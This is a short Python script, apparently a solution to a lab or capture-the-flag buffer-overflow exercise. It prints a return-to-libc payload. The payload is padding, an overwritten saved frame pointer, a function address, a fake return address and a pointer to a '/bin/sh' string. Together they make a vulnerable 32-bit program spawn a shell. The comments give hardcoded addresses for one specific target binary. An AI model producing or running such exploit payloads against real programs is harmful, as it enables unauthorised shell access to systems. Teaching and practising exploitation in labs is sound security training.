from shellcode import shellcode
import sys

# need to set return address to system
# need to set argument address to buf
# need to have buf contain "/bin/sh"
if __name__ == "__main__":
    # &buf is 0xfff6d866

    # write &system exit here: 0x080506f0
    sys.stdout.buffer.write(b"\x90" * 18)

    #write ebp here: 0xfff6d898
    sys.stdout.buffer.write(b"\x98\xd8\xf6\xff")
    
    #write syscall address here: 0x08051520
    sys.stdout.buffer.write(b"\x20\x15\x05\x08")

    # pad to arg1, use &system exit: 0x080506f0
    sys.stdout.buffer.write(b"\xf0\x06\x05\x08")

    #okay NOW write & of /bin/sh" here: which is &buf + 30 (+ 4 apparently)
    # = 0xfff6d866 + 0x1e = 0xfff6d888
    sys.stdout.buffer.write(b"\x88\xd8\xf6\xff")
    
    #now write "/bin/sh"
    sys.stdout.buffer.write(b"/bin/sh")

